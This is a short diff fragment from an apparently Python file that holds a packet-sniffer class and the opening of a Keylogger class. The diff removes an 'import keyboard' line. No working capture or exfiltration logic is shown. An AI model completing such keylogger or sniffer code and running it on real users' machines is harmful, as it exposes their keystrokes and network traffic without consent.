@@ -205,8 +205,6 @@ class Sniffer(threading.Thread):
             if self.packet_count >= self.max_packet_count:
                 self.capture_active = False
 
-import keyboard
-
 class Keylogger:
     def __init__(self):
         self.log = ""
